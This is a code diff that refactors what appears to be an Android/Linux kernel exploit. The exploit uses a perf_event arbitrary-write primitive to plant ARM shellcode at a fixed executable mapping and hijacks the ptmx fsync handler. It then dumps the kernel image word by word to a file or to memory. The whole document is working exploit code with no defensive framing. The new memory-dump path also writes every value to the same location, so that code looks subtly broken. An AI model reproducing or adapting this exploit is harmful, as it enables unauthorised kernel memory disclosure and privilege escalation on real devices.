@@ -234,7 +234,7 @@ check_possible_offset(int offset)
   return perf_event_run_exploit_with_offset(offset, (int)&nop, call_ptmx_fsync, NULL);
 }
 
-static int dump_code[] = {
+static int dump_code_asm[] = {
   0xe92d0008, /*   push    {r3}          */
   0xe59f3008, /*   ldr     r3, [pc, #8]  */
   0xe5930000, /*   ldr     r0, [r3]      */
@@ -244,15 +244,13 @@ static int dump_code[] = {
 };
 
 static bool
-write_kernel_memory_to_file(void *code_memory, const char *file_name)
+write_kernel_to(void *code_memory,
+                bool(*write_function)(int value, void *user_data),
+                void *user_data)
 {
-  int ptmx_fd, output_fd;
+  int ptmx_fd;
   unsigned int address;
-
-  output_fd = open(file_name, O_CREAT|O_WRONLY|O_TRUNC, 0644);
-  if (output_fd < 0) {
-    return false;
-  }
+  bool success = true;
 
   ptmx_fd = open("/dev/ptmx", O_WRONLY);
   for (address = KERNEL_ADDRESS; address < KERNEL_ADDRESS + KERNEL_SIZE; address += 4) {
@@ -260,31 +258,87 @@ write_kernel_memory_to_file(void *code_memory, const char *file_name)
     ((int*)code_memory)[5] = address;
     msync(code_memory, 0x20, MS_SYNC);
     value = fsync(ptmx_fd);
-    write(output_fd, &value, sizeof(value));
+    if (!write_function(value, user_data)) {
+      success = false;
+      break;
+    }
   }
   close(ptmx_fd);
-  close(output_fd);
+
+  return success;
+}
+
+static bool
+write_to_file(int value, void *user_data)
+{
+  int fd = (int)user_data;
+
+  return (write(fd, &value, sizeof(value)) == sizeof(value));
+}
+
+static bool
+write_kernel_to_file(void *dump_code, void *user_data)
+{
+  int fd;
+  unsigned int address;
+  bool success;
+  const char *file_name = (const char *)user_data;
+
+  fd = open(file_name, O_CREAT|O_WRONLY|O_TRUNC, 0644);
+  if (fd < 0) {
+    return false;
+  }
+
+  success = write_kernel_to(dump_code, write_to_file, (void*)fd);
+
+  close(fd);
+
+  return success;
+}
+
+static bool
+write_to_memory(int value, void *user_data)
+{
+  int **memory = (int**)user_data;
+
+  **memory = value;
 
   return true;
 }
 
 static bool
-dump_kernel_to_file(int offset, const char *file_name)
+write_kernel_to_memory(void *dump_code, void *memory)
 {
-  void *code_memory;
+  return write_kernel_to(dump_code, write_to_memory, &memory);
+}
+
+static void *
+setup_dump_code(void)
+{
+  void *dump_code;
+
+  dump_code = mmap((void*)0x1000, 0x20,
+                   PROT_READ|PROT_WRITE|PROT_EXEC,
+                   MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS,
+                   0, 0);
+  memcpy(dump_code, dump_code_asm, sizeof(dump_code_asm));
+
+  return dump_code;
+}
+
+static bool
+dump_kernel_to(int offset,
+               bool(*dump_function)(void *memory, void *user_data),
+               void *user_data)
+{
+  void *dump_code;
   int number_of_children;
 
-  printf("dump kernel image to %s.\n", file_name);
+  dump_code = setup_dump_code();
 
-  code_memory = mmap((void*)0x1000, 0x20,
-                     PROT_READ|PROT_WRITE|PROT_EXEC,
-                     MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS,
-                     0, 0);
-  memcpy(code_memory, dump_code, sizeof(dump_code));
-
-  number_of_children = perf_event_write_value_at_offset(offset, (int)code_memory);
+  number_of_children = perf_event_write_value_at_offset(offset, (int)dump_code);
   if (number_of_children < 0) {
-    munmap(code_memory, 0x20);
+    munmap(dump_code, 0x20);
     return false;
   }
 
@@ -294,13 +348,27 @@ dump_kernel_to_file(int offset, const char *file_name)
     }
   }
 
-  write_kernel_memory_to_file(code_memory, file_name);
+  dump_function(dump_code, user_data);
 
   perf_event_reap_child_process(number_of_children);
 
-  munmap(code_memory, 0x20);
+  munmap(dump_code, 0x20);
 
   return true;
+}
+
+static bool
+dump_kernel_to_file(int offset, const char *file_name)
+{
+  printf("dump kernel image to %s.\n", file_name);
+  return dump_kernel_to(offset, write_kernel_to_file, (void*)file_name);
+}
+
+static bool
+dump_kernel_to_memory(int offset, void *memory)
+{
+  printf("dump kernel image to memory.\n");
+  return dump_kernel_to(offset, write_kernel_to_memory, memory);
 }
 
 static bool
